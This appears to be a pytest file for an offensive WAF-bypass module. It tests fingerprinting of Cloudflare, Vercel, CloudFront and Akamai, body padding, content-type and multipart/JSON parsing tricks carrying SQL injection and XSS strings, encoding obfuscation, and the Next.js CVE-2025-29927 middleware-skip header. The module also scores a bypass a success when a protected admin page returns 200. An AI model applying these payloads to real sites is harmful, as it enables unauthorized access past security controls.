"""WAF bypass module (spec §2-§4): fingerprint, padding, WAFFLED mutations, CVE-2025-29927, engine."""
from __future__ import annotations

import json
from syber.waf import bypass as w


# --- §2 fingerprint --------------------------------------------------------- #
def test_fingerprint_vercel_cloudflare_cloudfront_akamai():
    assert w.fingerprint_waf(403, {"x-vercel-id": "a"}, "")["waf"] == "vercel"
    assert w.fingerprint_waf(403, {"cf-ray": "a"}, "")["waf"] == "cloudflare"
    assert w.fingerprint_waf(403, {"x-amz-cf-id": "a"}, "")["waf"] == "cloudfront"
    assert w.fingerprint_waf(403, {"server": "AkamaiGHost"}, "Access Denied Reference #1")["waf"] == "akamai"
    assert w.fingerprint_waf(200, {}, "hello")["waf"] == "unknown"


def test_fingerprint_body_inspection_limit():
    assert w.fingerprint_waf(403, {"cf-ray": "a"}, "")["body_inspection_limit_kb"] == 128
    assert w.fingerprint_waf(403, {"x-amz-cf-id": "a"}, "")["body_inspection_limit_kb"] == 64


# --- §3.1 body padding ------------------------------------------------------ #
def test_body_padding_urlencoded_and_json():
    up = w.body_padding(b"user=admin", "application/x-www-form-urlencoded", 2)
    assert up.endswith(b"user=admin") and len(up) > 2000 and b"=" in up
    jp = w.body_padding(b'{"user":"admin"}', "application/json", 2)
    assert jp[:1] == b"{" and b'"user":"admin"' in jp and len(jp) > 2000


# --- §3.2 content-type switch ----------------------------------------------- #
def test_content_type_switch_three_formats():
    v = w.content_type_switch({"u": "a", "p": "b"}, "p", "' OR 1=1--")
    techs = [x["technique"] for x in v]
    assert techs == ["ct_switch:urlencoded", "ct_switch:multipart", "ct_switch:json"]
    js = next(x for x in v if x["technique"] == "ct_switch:json")
    assert json.loads(js["body"])["p"] == "' OR 1=1--"


# --- §3.3 parsing discrepancy ----------------------------------------------- #
def test_multipart_discrepancy_families():
    v = w.multipart_parsing_discrepancy({"u": "a"}, "u", "<xss>")
    techs = {x["technique"] for x in v}
    assert {"mp:dup_boundary", "mp:charset_utf16", "mp:trailing_space", "mp:no_final_boundary"} <= techs
    dup = next(x for x in v if x["technique"] == "mp:dup_boundary")
    assert dup["headers"]["Content-Type"].count("boundary=") == 2   # duplicate boundary


def test_json_discrepancy_dup_key_uses_payload_last():
    v = w.json_parsing_discrepancy({"x": "1"}, "q", "<xss>")
    dup = next(x for x in v if x["technique"] == "json:dup_key")
    # raw text has q twice; the LAST value is the payload
    assert dup["body"].count(b'"q"') == 2 and b"<xss>" in dup["body"]


# --- §3.4 Next.js CVE-2025-29927 ------------------------------------------- #
def test_nextjs_middleware_payloads():
    vals = [list(h.values())[0] for h in w.nextjs_middleware_headers()]
    assert "middleware:middleware:middleware:middleware:middleware" in vals   # Next 15.x
    assert "pages/_middleware" in vals                                        # Next 12.x
    assert all(list(h.keys())[0] == "x-middleware-subrequest" for h in w.nextjs_middleware_headers())


# --- §3.7 encoding ---------------------------------------------------------- #
def test_encoding_obfuscation_variants():
    out = w.encoding_obfuscation("<script>")
    assert any("%25" in x for x in out)          # double url-encode
    assert any("\\u003c" in x for x in out)      # unicode
    assert any("&lt;" in x for x in out)         # html entity


# --- §4 engine: block detection + win detection ----------------------------- #
def test_engine_block_and_win_detection():
    e = w.BypassEngine(waf="vercel")
    assert e.is_blocked(403, "x") is True
    assert e.is_blocked(200, "Attention Required! Cloudflare") is True
    assert e.is_blocked(200, '{"data":1}') is False
    # win: was blocked, now 200 with materially bigger body
    assert e.bypassed(403, 20, 200, "REAL CONTENT " * 40) is True
    # not a win: another block page
    assert e.bypassed(403, 20, 200, "Access Denied") is False


def test_run_bypass_nextjs_middleware_end_to_end():
    def fetch(u, method="GET", headers=None):
        headers = headers or {}
        if headers.get("x-middleware-subrequest", "").startswith("middleware"):
            return {"status": 200, "body": "ADMIN DASHBOARD " * 50, "headers": {}}
        return {"status": 403, "body": "Vercel Security", "headers": {"x-vercel-id": "z"}}
    r = w.run_bypass("https://app.x/admin", fetch)
    assert r["bypassed"] and r["waf"] == "vercel"
    assert r["winner"]["headers"]["x-middleware-subrequest"].startswith("middleware")


def test_run_bypass_baseline_not_blocked():
    r = w.run_bypass("https://x/", lambda u, method="GET", headers=None: {"status": 200, "body": "ok", "headers": {}})
    assert r["bypassed"] is False and "not blocked" in r.get("note", "")
